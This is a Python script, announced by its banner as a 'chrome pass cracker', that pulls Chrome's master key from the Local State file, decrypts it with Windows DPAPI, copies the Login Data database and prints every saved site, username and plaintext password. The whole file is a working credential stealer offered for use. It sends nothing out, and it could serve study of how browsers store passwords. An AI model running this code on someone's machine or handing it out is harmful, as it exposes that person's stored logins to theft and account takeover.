#!/usr/bin/python
# -*- coding: ascii -*-
import os
import json
import base64
import sqlite3
import win32crypt
import sys
import subprocess
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

r ='\033[91m' # red
g ='\033[92m' # green
b = '\033[94m' # blue
y = '\033[93m' # yellow
s_b ='\033[96m' # sky_blue
pi = '\033[35m' # pink
reset = '\033[0m' # reset
blink = "\033[5;92m" # blink

print(g+"")
print("")
print("")
print("")
print("                                                 <<=====[ "+"chrome pass cracker"+" ]=====>>")
print("                                                       <<=== #MR WHITE HIRU ===>>")
print("                                                               <==HISL==>")
print("")
print("")
print("")

print("                                                          <<===PASS LIST====>>")
print("")
print("")
print("")
def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    
    key = key[5:]
    
    
    
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        
        iv = password[3:15]
        password = password[15:]
        
        cipher = AES.new(key, AES.MODE_GCM, iv)
        
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            
            return ""


def main():
    
    key = get_encryption_key()
    
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    
    
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("")
        print("<<"+"*"*50+">>")
        print("")
    cursor.close()
    db.close()
    try:
        
        os.remove(filename)
    except:
        pass



# output = main()
# try:
    
    
#     output = subprocess.check_output(['python', 'main.py'], stderr=subprocess.STDOUT, universal_newlines=True)
# except subprocess.CalledProcessError as e:
#     output = e.output
# except KeyboardInterrupt:
#     output = ''


# with open('output.txt', 'w') as file:
#     file.write(output)


if __name__ == "__main__":
    main()